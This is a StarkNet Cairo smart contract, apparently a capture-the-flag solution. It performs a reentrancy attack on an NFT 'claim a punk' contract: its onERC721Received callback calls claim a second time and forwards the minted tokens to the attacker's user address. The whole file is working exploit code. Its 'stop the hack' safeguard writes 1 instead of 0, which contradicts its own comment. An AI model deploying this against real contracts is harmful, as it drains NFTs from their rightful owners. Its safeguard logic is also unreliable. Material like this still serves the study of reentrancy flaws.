// SPDX-License-Identifier: MIT

// This contract is used in the context of a reentrancy attack
%lang starknet
%builtins pedersen range_check

from starkware.cairo.common.cairo_builtins import HashBuiltin
from starkware.cairo.common.uint256 import Uint256, uint256_add
from starkware.cairo.common.math import assert_not_zero
from starkware.starknet.common.syscalls import get_caller_address, get_contract_address, deploy
from openzeppelin.utils.constants.library import (IERC721_RECEIVER_ID,)

@contract_interface
namespace IClaimAPunk {
    func claim(to: felt) {
    }
}

@contract_interface
namespace I721 {
    func transferFrom(from_: felt, to: felt, tokenId: Uint256) {
    }
}

@storage_var
func _continue() -> (stop: felt) {
}

@storage_var
func user() -> (address: felt) {
}

@storage_var
func target() -> (address: felt) {
}

@storage_var
func punk() -> (address: felt) {
}


// The player calls this function to start the attack.
@external
func hack{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(addressContract: felt, addressUser: felt, addressPunk: felt) {
    alloc_locals;

    // enable hack 
    _continue.write(1);

    let (currentContractAddress) = get_contract_address();

    // write the addresses of the user and the contract inside the storage (when TSTORE?)
    user.write(addressUser);
    target.write(addressContract);
    punk.write(addressPunk);

    // call claim for the first time -- this call will mint the first punk for this contract
    IClaimAPunk.claim(contract_address=addressContract, to=currentContractAddress);

    return();
}


// This method is automatically called by the contract of the NFT to check if the contract supports the correct interface.
// All we have to do is to return the 1 in any case.
@view
func supportsInterface{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
    interfaceId: felt
) -> (success: felt) {
    return (success=1);
}


// This method is automatically called by the contract of the NFT -- magic happens here
// The contract will mint a punk for the player and then transfer the punk 
// minted earlier in the hack function to the player.
// The method is called in the same transaction that the hack method
@external
func onERC721Received{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
        operator: felt, from_: felt, tokenId: Uint256, data_len: felt, data: felt*
    ) -> (selector: felt) {
    alloc_locals;
    let (isContinue) = _continue.read();

    if (isContinue == 0) {
        return (selector=IERC721_RECEIVER_ID);
    }

    // stop the hack -- safeguard against reentrancy loop
    _continue.write(1);

    let (_user) = user.read();
    let (isContinue) = _continue.read();
    let (_target) = target.read();
    let (currentContractAddress) = get_contract_address();

    // claim the token a second time -- this call mint a punk to the user
    IClaimAPunk.claim(contract_address=_target,to=_user);

    let (addressPunk) = punk.read();

    // transfer the initial token minted for this contract to the user
    I721.transferFrom(contract_address=addressPunk,from_=currentContractAddress,to=_user,tokenId=tokenId);

    return (selector=IERC721_RECEIVER_ID);
}
